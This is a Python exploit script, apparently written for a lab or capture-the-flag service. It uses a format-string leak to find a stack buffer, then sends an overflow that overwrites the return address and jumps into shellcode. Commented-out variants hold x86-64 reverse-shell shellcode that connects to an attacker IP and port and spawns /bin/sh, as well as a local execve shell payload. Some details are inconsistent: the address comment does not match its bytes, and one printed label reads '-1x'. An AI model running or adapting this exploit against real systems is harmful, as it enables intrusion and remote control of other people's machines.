import struct
import socket

s = socket.socket()
s.connect(('10.2.10.7', 1337))
r = s.recv(1024)
message = ("%p,%p,%p\n")
s.send(message.encode('utf-8'))
while ',' not in r.decode('utf-8'):
    r = s.recv(1024)
    receive = r.decode('utf-8')
    print(receive)
start_buf = int(receive.split(',')[1], 16)-9
print("leaked start of buffer: -1x{:08x}".format(start_buf))

input('EXPLOIT?')
padding = b"dsuhagf ujkagsefjkygvasbjyfgvebaysufgvbeuaysbfvgajsyvbgjasyvbgfjkaysegvbfyjavbgfeyabvfgjyabvfyjagbvfyavbkjfeygvbaekjfygbvayesjgvbkajefvygbaejkyfgbaesyjbxreayksfugaskhjfedukasjfheasgv,ekirfaklsfgskaeifygdahs,fkjeuaskl.ejgfsajhfetgvasbkjfghevbafyutdlsfaekifgbsajkdua"
shellcode = b"\xcc"*72
#shellcode = (
#b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
#b"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
#b"\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24"
#b"\x02\x11\x5c\xc7\x44\x24\x04\xc0\x80\x10\x0a\x48\x89\xe6\x6a\x10"
#b"\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48"
#b"\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
#b"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"
#b"\x5f\x6a\x3b\x58\x0f\x05"
#)
#shellcode = b"\x90\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
RIP = struct.pack("Q", (start_buf+len(padding)+8))
print(RIP)
payload = padding + RIP + shellcode
s.send(payload)

# from telnetlib3 import Telnet
# t = Telnet()
# t.sock = s
# t.interact()
# s.close()
  
#define IPADDR "\xc0\x80\x10\x0a" /* 192.168.1.10 */
#define PORT "\x7a\x69" /* 31337 */

